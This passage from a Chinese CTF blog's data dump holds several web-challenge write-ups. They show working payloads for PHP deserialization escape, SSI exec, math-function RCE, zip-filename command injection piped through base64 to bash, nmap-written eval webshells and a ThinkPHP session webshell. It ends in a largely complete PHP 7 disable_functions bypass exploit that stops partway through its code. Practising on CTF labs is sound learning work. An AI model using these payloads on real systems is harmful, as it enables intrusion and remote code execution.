preg_replace($escape, '_', $string);  //一顿操作下来就是一个正则\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\nsession_start();\n$user = new user();\n$user->connect($config);\n```\n\n直接定位到update_profile函数\n\n```cmake\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n```\n\n这里通过继承类，调用父类的filter函数\n\n```cmake\npublic function filter($string) {     //父类filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //一顿操作下来就是一个正则\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n\n这里相当于一个过滤器\n\n重点看第二个正则 如果我们传入的字符串有`'select', 'insert', 'update', 'delete', 'where'`则会被替换为`hacker`  至此暂时结束\n\n当我们上传完update.php需要的信息之后会跳入profile.php\n\n```cmake\n//profile.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\t$username = $_SESSION['username'];\n\t$profile=$user->show_profile($username);\n\tif($profile  == null) {\n\t\theader('Location: update.php');\n\t}\n\telse {\n\t\t$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n?>\n```\n\n这里终于看到了我们常见的漏洞点file_get_contents()函数\n\n先经过反序列化`$profile`数组\n\n然后base64编码读出`$profile['photo']`\n\n之前看到config.php中含有flag 那么我们可以让`$profile['photo']=config.php`不就可以拿到flag了\n\n## 解题：\n\n但是photo部分是文件上传部分，并不能直接让他等于config.php去拿到flag\n\n这里就要用到反序列化字符串逃逸了\n\n在整个过程中存在序列化与反序列化，我们可以在nickname部分构造出符合反序列化的字符串，在nickname存在config.php让其反序列化到后边的photo部分，相当于提前结束反序列化，让原本photo部分的反序列化部分丢失，从而达到使得`$profile['photo']=config.php`\n\n那么我们需要在nickname序列化后的部分塞入`\";s:5:\"photo\";s:10:\"config.php\";}`共33个字符\n\n这里构造合法反序列化部分很巧妙\n\n之前看代码它存在一个过滤器\n\n```cmake\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n```\n\n如果我们只是单纯把`\";s:5:\"photo\";s:10:\"config.php\";}`这一部分塞入nickname那么它经过序列化后，再经过反序列化全部部分还是属于nickname部分，我们就需要在他序列化后构造让他字符串溢出，然后溢出部分就会到photo部分\n\n我们可以让`nickname=where`然后序列化后经过过滤器where会被替换为hacker,where为5个字符，而hacker为6个字符，多出一个字符，就这样使得它在反序列时还是按照原本5个字符去反序列化，还有一个字符就溢出逃逸了。\n\n可以简单借助下面的脚本理解：\n\n```php\n<?php\nfunction filter($string) {     //父类filer\n    $escape = array('\\'', '\\\\\\\\');\n    $escape = '/' . implode('|', $escape) . '/';\n    $string = preg_replace($escape, '_', $string);  //一顿操作下来就是一个正则\n\n\n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string);\n}\n$profile = array(\"phone\"=>\"12345678912\",\"email\"=>\"123@qq.com\",\"nickname\"=>\"where\",\"photo\"=>\"abc\");\n$a = serialize($profile);\necho $a;\necho \"\\n\";\necho filter($a);\n?>\n```\n\n输出：这里第二行hacker明明是6个字符但是在序列化字符串中还是显示5，那么多余出来的一个字符将会在反序列化过程中逃逸。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292442387-dfaaedff-1c6d-4dbc-a7bf-f889153b5ded.png)\n\n那么我们塞入字符串`\";s:5:\"photo\";s:10:\"config.php\";}`是33个字符，则需要33个where\n\n但是之前看到nickname部分不能超过10个字符\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292530703-ad1938a2-50bb-44cb-b17f-326547c2d3b9.png)\n\n这里可以通过数组方式绕开正则匹配即`nickename[]`\n\n这里`$profile`已经是一个数组了，如果数组里面再包含一个数组，那么序列化后的字符串稍有不同。\n\n通过一个脚本来帮助理解：\n\n```php\n<?php\n$a = array(\"name\"=>'Tom',\"age\"=>array(17));\necho serialize($a);\n?>\n```\n\n输出：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292655293-2cc8bf95-340a-4112-8ae9-dfd90f65fb8c.png)\n\n会有花括号去包裹数组中的数组部分，那么我们在闭合nickname这部分时也需要特意构造一个右花括号去闭合，使其成为合法反序列化部分。\n\n即`\";}s:5:\"photo\";s:10:\"config.php\";}`我们需要塞入34个字符\n\n那么nickname就需要有34个where\n\n```\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n其他部分任意\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292841846-e07c45fe-820f-4146-9ee8-3ffd7c96068d.png)\n\n进入profile.php去解码这段base64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292879095-67419a27-16e3-4ec0-857c-ebabf61f6e6f.png)\n\n就可以拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292910852-9d761113-d1cd-4816-921d-e3b225f34f46.png)\n","tags":["反序列化","代码审计","反序列化字符串逃逸"],"categories":["buuctf"]},{"title":"buuctf-63-[SUCTF 2019]Pythonginx","url":"/post/487317b8.html","content":"\n[SUCTF 2019]Pythonginx\n\n<!--more-->\n\n一道关于python解析idna编码与utf-8解码后的字符串的漏洞题目\n\nCVE-2019-9636：urlsplit 不处理 NFKC 标准化\n\nCVE-2019-10160：urlsplit NFKD 标准化漏洞\n\n源码：\n\n```cmake\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n   \n    <!-- Dont worry about the suctf.cc. Go on! -->\n    <!-- Do you know the nginx? -->\n```\n\n完整分析过程：\n\n```python\nfrom flask import Flask, Blueprint, request, Response, escape ,render_template\nfrom urllib.parse import urlsplit, urlunsplit, unquote\nfrom urllib import parse\nimport urllib.request\nurl =\"http://www.baidu.com/index.php\"\nhost = parse.urlparse(url).hostname #第一次host\nprint(\"第一次host:\",host)\nparts = list(urlsplit(url))\nprint(\"parts:\",parts)\nhost = parts[1]  #第二次host\nprint(\"第二次host:\",host)\nnewhost = []\nprint(\"以点分割：\",host.split('.')) #以.为分隔符返回一个列表\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8')) #漏洞产生点\nprint(\"经过idna编码与utf-8解码后newhost:\",newhost)\nparts[1] = '.'.join(newhost)\n#去掉 url 中的空格\nfinalUrl = urlunsplit(parts).split(' ')[0]\nhost = parse.urlparse(finalUrl).hostname  #第三次host\nprint(\"第三次host:\",host)\n```\n\n这里说说host与hostname吧\n\n `host=hostname+':'+port(not 80)`  \n\n 如果http使用默认的80端口，host可以省略掉冒号+端口，看上去和hostname一样 \n\n```\nhost = parse.urlparse(url).hostname\n```\n\n这一行获取我们的hostname 并且需要有协议才行 比如https://,http://,或者file://，这样才能获取到我们的hostname，也就是payload形式，必须也是这样包含协议的形式\n\n具体分割部分，可以去看官方手册https://docs.python.org/zh-cn/3/library/urllib.parse.html?highlight=urlsplit\n\n输出：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210222158-baba3125-052f-4eae-b0eb-681f23c4953a.png)\n\n目标绕开第一第二个if，那么操作点就在这里\n\n```cmake\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8'))\n```\n\n比如` ℆ ` 这个字符经过以上操作之后就变为了c/u\n\n那么我们就可以让题目需要的`suctf.cc`改为`suctf.c ℆ `然后经过idna编码utf-8解码后，变为我们需要的suctf.cc/u\n\n还需要了解一些关于nginx的重要文件位置：\n\n- 配置文件存放目录：/etc/nginx\n- 主配置文件：/etc/nginx/conf/nginx.conf\n- 管理脚本：/usr/lib64/systemd/system/nginx.service\n- 模块：/usr/lisb64/nginx/modules\n- 应用程序：/usr/sbin/nginx\n- 程序默认存放位置：/usr/share/nginx/html\n- 日志默认存放位置：/var/log/nginx\n- 配置文件目录为：/usr/local/nginx/conf/nginx.conf\n\n先来找flag文件的位置，看了wp\n\npayload:`?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210794235-67212c4a-f398-4e90-9615-d84f0c656810.png)\n\n读就行了`?url=file://suctf.c℆sr/fffffflag`\n","tags":["python","nginx"],"categories":["buuctf"]},{"title":"buuctf-62-[BJDCTF2020]EasySearch","url":"/post/9c6e15d.html","content":"\n[BJDCTF2020]EasySearch\n\n<!--more-->\n\n扫网站后台，buu常常扫不出来算了，直接从网上扒一个\n\n发现有/index.php.swp\n\n源码如下：\n\n```cmake\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n需要密码前六位md5值等于`6d0bc1`\n\n借助脚本\n\n```python\nfrom hashlib import md5\n\n\nfor i in range(10000000):\n    if md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1':\n        print(i)\n```\n\n随便选一个 2020666\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037918710-62fadfa4-b94f-45b9-bf41-9ecf8f5ebd72.png)\n\n```\n/public/6a55805e27f57db992ebd9b47735c84cb7ec8e91.shtml\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037955243-8985022f-0080-4da4-86cd-967c1e4c6651.png)\n\n看到这里大概率是ssti 但是抓包看既不是python也不是php 所以不会了\n\n看了wp 才发现是没见过的shtml\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038075990-bfd32873-f395-4af3-8019-feae3efe14ab.png)\n\n其实在源码中也有稍微提示\n\n 第17行`$shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");`\n\n直接用payload\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038127194-eea19322-3722-45f8-8191-7dcc3e994406.png)\n\npayload：\n\nflag在上层目录\n\n```\n<!--#exec cmd=\"ls ../\"-->\n<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683039208613-241c74dc-ae63-426a-b76c-fceeb8e41dba.png)\n","tags":["ssti","shtml"],"categories":["buuctf"]},{"title":"buuctf-55-[CISCN 2019 初赛]Love Math","url":"/post/102492d1.html","content":"\n[CISCN 2019 初赛]Love Math\n\n<!--more-->\n\n这道题就是bypass 利用进制转换函数构造rce 挺不错的\n\n源码如下:\n\n```cmake\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\n## 解法一：\n\n利用进制转换函数\n\npayload:`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag`\n\n分析：\n\n`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))`这一步是构造出_GET\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033094045-2aedb2fb-1341-4c26-8fe7-a9cae55fc613.png)\n\n这里用36进制原因是包含数字字母多可以构造函数名很方便\n\n选择hex2bin这个函数是因为这个函数可以将16进制字符串转化为2进制字符串，这里可以这么理解我们常见到的字符串就是2进制的字符串（不严谨），这里面起了一个相当于将16进制转化为字符串的作用\n\n大概如图这样的作用\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033601976-34ae25d6-fd29-4fbb-a6b9-b8fb1a80feae.png)\n\n拆解：\n\n```\n$pi=_GET\n$_GET[pi]($_GET[cos])\npi=system cos=cat /flag\nsystem(cat /flag)\n```\n\n注意这里`$pi`和`pi`是两个不同的概念，一开始搞混了，至于这里为什么选择`pi`和`cos`作为参数名是因为这两个函数名占位最少，因为限制我们长度必须在80以内\n\n## 解法二\n\n利用getallheaders()函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033809691-3f418625-2ff3-430c-a2a0-10762f2fc4eb.png)\n\n返回一个数组\n\npaylaod:`?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`\n\n相当于构造`exec(getallheaders(){1})`\n\n因为返回一个数组所以原来应该为`getallheaders()[1]`因为`[]`被屏蔽了,所以用`{}`bypass\n\n然后1为键名 所以在请求头增加一个`1: cat/flag`即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683034156126-623b55ac-0e55-40d8-a6bf-ff0e7c9e516c.png)\n","tags":["命令执行","RCE奇淫方式","bypass"],"categories":["buuctf"]},{"title":"AntCTF x D³CTF简单复现","url":"/post/e2c24be6.html","content":"\n菜鸡的自我羞辱\n\n<!--more-->\n\n# 前言\n\n有稍微看了下这个比赛，一眼就不属于我这个水平人做的，稍稍看了一道披着web皮的misc，感觉稍微有点思路，赛后看看大佬们的wp，给自己涨涨见识。\n\n# 正题\n\n## d3readfile(Misc)\n\n老套路先读读`/etc/passwd`可以读到\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954270870-621e1a29-e228-4eb2-9d64-1c21454e7eea.png)\n\n再看看环境变量\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954383884-d90e322b-4fe6-46b6-a14f-825692562e07.png)\n\n发现hint 解码发现提示\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954420464-5d98a90e-1a74-42b6-ae64-c64de031e97d.png)\n\n提示关键字是locate\n\n看了大佬的wp：locate 命令是查询文件所在位置的，会在本地缓存数据库，文件名为:locate.db,不同版本似乎缓存的目录并不一样\n\n问问chatgpt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954548792-8766f875-f44c-4f32-aafe-9e7f50cbafac.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682996671795-81e5f146-61a1-4df9-8a4c-2a24db39b17c.png)\n\n不同的linux系统位置不同\n\n- Ubuntu / Debian：/var/lib/mlocate/mlocate.db\n- CentOS / Fedora / RHEL：/var/lib/locatedb\n- Arch Linux：/var/lib/pacman/local/mlocate*/mtree\n- Gentoo: /var/cache/edb/locate.database\n- Slackware: /var/lib/slocate/slocate.db\n- FreeBSD: /var/db/locate.database\n- OpenSUSE：/var/lib/slocate/slocate.db\n- Mageia：/var/lib/mageia/mlocate.db\n- Oracle Linux：/var/cache/locate/locatedb\n\n最后发现是 \n\n```\nOracle Linux：/var/cache/locate/locatedb\n```\n\n发现flag路径：`opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954629044-6d77fc45-bf46-4e85-924e-9d2fe577e2ca.png)\n\nGet it!\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954670000-70aae100-4ab6-45ae-8e9f-984d320f1abc.png)\n\n## d3cloud(Web)\n\n这题看大佬WP是unzip处命令注入\n\n界面ui什么用都没有 直接进admin后台 `/admin`\n\n要登陆 `admin/admin`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683001433174-c5787435-e598-4d31-a52b-a50681371de4.png)\n\n发现一个php文件\n\n这里看wp是与官方文档相比多了点代码，那么做这道题还需要现场搭环境和代码审计qwq tql\n\n```cmake\npublic function putFileAs($path, $file, $name, $options = [])\n    {\n        $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');\n        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));\n        if (!in_array($file_type, $supported_file)) {\n            return false;\n        }\n        $stream = fopen($file->getRealPath(), 'r+');\n        $result = $this->put(\n            $path = trim($path.'/'.$name, '/'), $stream, $options\n        );\n        if (is_resource($stream)) {\n            fclose($stream);\n        }\n        if($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n        }\n        return $result ? $path : false;\n    }\n```\n\n是这里存在命令注入\n\n```cmake\nif($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n```\n\n看大佬分析unzip命令如下：\n\n```\nunzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/\n```\n\n然后利用zip文件名写shell\n\n```\n1;echo bHMgLz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvbHMudHh0|base64 -\nd|bash;.zip\n```\n\n简单解释一下 将`ls /`结果重定向到`/var/www/html/public/ls.txt`文件中\n\n这里必须有换行符 不然写不进入 估计是代码审计中文件名处有转义或者别的操作 通过换行绕过\n\n还有一个疑问就是写入文件的路径是怎么获取的？是自己搭环境弄到的吗qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002231725-7a1fab4c-f29d-4a0f-be37-d474d8df51bd.png)\n\n直接访问ls.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002436158-744f4590-d747-41ff-baa0-d4b3593bead9.png)\n\n继续和上面一样的操作\n\n```\n1;echo Y2F0IC9mbDFBZz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvZmxhZy50eHQ=|base64 -\nd|bash;.zip\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002482821-010b80b2-9d7c-4f50-a51b-411008a3ac3b.png)\n\n### 小总结一下：\n\n很多难题还是需要获取到相关版本后，需要自己本地搭建去调试，才能慢慢发现漏洞\n\n代码审计能力很重要qwq\n\n\n\n# 尾巴\n\n其他的wp都看不懂 还是慢慢来吧\n\n看了一下这种真正难的ctf 大大的寄写在我脸上 \n","tags":["命令执行"],"categories":["各赛事WP"]},{"title":"buuctf-52-[网鼎杯 2020 朱雀组]Nmap","url":"/post/c93f1585.html","content":"\n[网鼎杯 2020 朱雀组]Nmap\n\n<!--more-->\n\n看题目是一道关于nmap的题目\n\n试试127.0.0.1\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png)\n\n再来试试我本地kali的nmap\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png)\n\n几乎是一样的 估计就只是放了个接口\n\n nmap 命令可以将扫描结果保存在文件里面 \n\n就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护  与之前做的有道题目很相似\n\n可以用空格与单引号绕过\n\n选项：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png)\n\n最终payload：\n\n```\n' <?= @eval($_POST[1]);?> -oG a.phtml '\n```\n\n之后rce就行了\n","tags":["nmap","esc***函数"],"categories":["buuctf"]},{"title":"buuctf-96-[GYCTF2020]EasyThinking","url":"/post/db3afe26.html","content":"\n[GYCTF2020]EasyThinking\n\n<!--more-->\n\n看标题是一个关于thinkphp的漏洞\n\n先随便乱输，发现是thinkphp6\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050340127-2a4df26d-b7ea-4d7b-8d00-1b8d918cdfa7.png)\n\n上网查一下漏洞，发现存在一个任意文件创建漏洞 （参考：https://www.anquanke.com/post/id/257485#h3-3）\n\n先注册一个账号 然后登录抓包 修改phpsessid这里\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050525889-201d9ede-14f7-40f0-838c-a802991c0e86.png)\n\n这里可以随便输入，然后会在`/runtime/session/sess_刚刚输入的32字符`生成一个文件 \n\n这里之后我们要进行命令执行，所以最好将字符串设为带有php后缀的文件\n\n然后在搜索这里上传我们的一句话木马\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050675837-fd4031ba-50f3-45b9-a53e-bc98875871ee.png)\n\n蚁剑连接 `http://7f188c29-b095-4cdc-8aad-37aa4b61403f.node4.buuoj.cn:81/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`\n\ngetshell之后发现读不了flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050780538-11589c45-5e9d-4046-a790-d8377818edb7.png)\n\n查看phpinfo()之后发现禁用了很多函数，做到这里和之前buu有道题目很像，有两种做法\n\n## 第一种解法 蚁剑插件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051090942-b7882cf9-e5b3-44fe-b624-0506cf666fd1.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051116541-e04d75d7-5362-4bf1-8644-0e3123f7ce13.png)\n\n## 第二种解法  上传一个绕过disable_functions的脚本  \n\nexp：7.3的版本 这里要注意php版本 不同版本对应的脚本不同\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"/readflag\");\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n\n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) 